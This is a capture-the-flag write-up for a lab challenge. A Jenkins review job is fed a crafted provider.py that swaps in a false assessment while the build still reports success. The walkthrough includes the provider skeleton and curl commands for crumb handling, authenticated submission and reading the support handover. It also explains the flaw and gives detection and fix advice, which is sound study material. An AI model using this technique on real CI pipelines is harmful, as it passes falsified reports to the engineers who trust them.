# K02.3 — Green, with our changes

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** pi lane K09

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Interface-only validation — the pipeline checks schema and shape, not whether the *assessment* is what the build produced |
| **Tools** | `curl` (Jenkins, support API), `python3`, `zip`, a cookie jar for the CSRF crumb |
| **Attack surface** | `fieldlink-report-review` on `https://ci.keplerops.test`; `GET https://support.keplerops.test:8443/api/handovers/current` |
| **Prerequisite** | The K02.2 contract (`fieldkest.report/v2`, `provider.py:render_report`), the exact-byte fixture, `rowan.ito` credentials |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how to make a build go green while the report handed to a support
engineer says what the build never observed. The bug class is *validation of form instead of
content*: the review job accepts a provider that satisfies the interface, and the handover trusts
the result because the job reported success.

## Objective

> Change the report produced by the test job while keeping the interface its caller expects. The
> support engineer should receive Cinder's version with a successful job result.

Three constraints at once: content becomes the Cinder assessment, the interface stays as the caller
expects, and the job reports success. Not a bypass — a supply-chain move: you *become* the report
producer and satisfy the contract honestly.

## Background you need

- **`render_report` is the extension point**: the job imports `provider.zip`, loads `provider.py`
  and publishes whatever `render_report` returns.
- **Schema validation is not semantic validation.** A validator proves the output has
  `schema: fieldkest.report/v2`, the required keys and types; it cannot prove the observations
  were taken or that the assessment matches the metrics.
- **The handover is downstream evidence**: `fieldkest.support-handover/v1` carries `state`,
  `job_id` and the report; a job that says `success` lends the report its trust.

## Walkthrough

### 1. Read the contract you must satisfy

From K02.2: schema `fieldkest.report/v2`, `provider.py` exporting `render_report`, immutable and
mutable fields distinct, exact-byte fixture binding, delivery as `provider.zip` — one function:

```python
# illustrative provider.py — the shape the contract requires
import json
def render_report(inputs):
    report = json.loads(inputs["baseline"])
    report["assessment"] = "<Cinder's assessment>"
    return report
```

The provider returns a *valid* report whose assessment differs from the baseline — nothing stops
that, because the assessment is the mutable field.

### 2. Package and submit with the CSRF crumb (the real trap)

```bash
zip -r provider.zip provider.py
```

Jenkins rejects the build with `403 No valid crumb` unless crumb and POST share a cookie jar:

```bash
curl -sS -c /tmp/ck -u 'rowan.ito:fk_developer_…' \
  'https://ci.keplerops.test/crumbIssuer/api/json' | jq -r '.crumb' > /tmp/crumb
curl -sS -b /tmp/ck -u 'rowan.ito:fk_developer_…' -X POST \
  -H "Jenkins-Crumb: $(cat /tmp/crumb)" -F 'provider=@provider.zip' \
  'https://ci.keplerops.test/job/fieldlink-report-review/buildWithParameters'
```

### 3. Confirm green, then read the handover

```bash
curl -sS -u 'rowan.ito:fk_developer_…' \
  https://ci.keplerops.test/job/fieldlink-report-review/lastBuild/api/json | jq '{result}'
curl -sS -u 'rowan.ito:fk_developer_…' \
  https://support.keplerops.test:8443/api/handovers/current | jq .
```

`result: SUCCESS` is the second requirement: a *successful job result*, not a crash.

The response is `fieldkest.support-handover/v1` with `state: "success"`, job id
`JOB-BA11FC0CCB19` and the report — Cinder's assessment, produced by our provider and delivered to
the support queue. The accepted value is in that handover, not reproduced here.

## Why this works (the vulnerability explained)

The pipeline has an *authorisation* question and a *provenance* question and answers only the
first. Anyone with build permission may submit a provider, so submission is authorised — but the
pipeline never asks "did this report come from the observation it claims to describe?" It checks
the schema, runs the provider and publishes whatever it returns.

That gap is the bug class: **the validator proves shape, the consumer assumes truth**. Same failure
as an approved image with a swapped entrypoint, a signed config with attacker-chosen values, or a
harness that reports `PASS` because the assertion function was replaced. Defenders bind content to
origin: sign the report with the runner key, include the observation hash it came from, verify at
the consumer. A green build is a claim about the build step, not the data.

## Detection and fix

- **Log signal:** providers submitted by identities that never authored the connector/report code;
  hard-coded assessment text; an assessment that changes while metrics do not.
- **Fix:** sign reports with the runner identity and verify at the consumer; pin the provider to a
  reviewed digest; treat `state=success` as a build outcome only.

## Notes and dead ends

- **Evidence is good on the *outcome*, thin on *steps*.** Lane K09 recorded the accepted
  `provider.zip`, the handover (`state=success`, `job_id=JOB-BA11FC0CCB19`, report = Cinder's
  assessment) and the flag constant in the worker source; the crumb requirement and
  `buildWithParameters` route come from lane K02's notes and the range map. The `provider.py`
  above is an illustrative skeleton, not a captured file.
- The worker source leak (`/opt/fieldkest/ci.py`) documents the same flag constant, but reading it
  needed a *different* foothold (K09) — corroboration, not this card's intended path.
- Skipping the cookie jar is the usual failure: crumb and POST must share `-c`/`-b`, else you get
  `403 No valid crumb`, which looks like a permission problem.
